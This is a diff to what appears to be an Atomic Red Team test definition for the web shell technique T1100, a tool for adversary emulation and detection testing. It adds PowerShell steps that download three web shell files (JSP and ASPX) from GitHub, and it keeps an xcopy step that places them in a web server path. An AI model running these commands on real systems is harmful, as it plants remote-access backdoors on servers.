@@ -19,9 +19,22 @@ atomic_tests:
       description: Path of Web Shell
       type: path
       default: PathToAtomicsFolder\T1100\src\
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Web shell must exist on disk at specified location (#{web_shells})
+      prereq_command: |
+        if (Test-Path #{web_shells}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
+
   executor:
     name: command_prompt
     command: |
       xcopy #{web_shells} #{web_shell_path}
     cleanup_command: |
-      del #{web_shell_path}
+      del #{web_shell_path} >nul 2>&1
